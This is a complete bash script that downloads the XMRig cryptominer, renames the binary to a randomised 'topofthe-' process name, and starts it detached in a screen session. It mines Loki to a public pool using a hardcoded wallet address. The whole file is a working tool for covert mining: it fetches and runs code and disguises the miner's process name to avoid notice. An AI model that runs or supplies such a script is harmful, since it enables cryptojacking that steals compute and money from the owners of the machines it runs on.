#!/bin/bash
sudo apt-get update
azure=topofthe;
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-3.2.0
wget https://github.com/xmrig/xmrig/releases/download/v3.2.0/xmrig-3.2.0-xenial-x64.tar.gz 
mv xmrig-3.2.0-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf xmrig-3.2.0-xenial-x64.tar.gz
rm -rf xmrig-3.2.0-xenial-x64.tar.gz && cd xmrig-3.2.0
a='topofthe-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
mv xmrig $azure -n
sudo cp $azure "$cpuname"
sudo rm -f  xmrig
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LZNMXtWkUrxLexkWqMA7RoYNdpjFtENkYa4XeKdxviJuV5esQYV6puq4KM2mz9ZLVD9CL96e2vnqbSQbs4r4vB6vKiqQDyB -p Logatic -a rx/loki -k
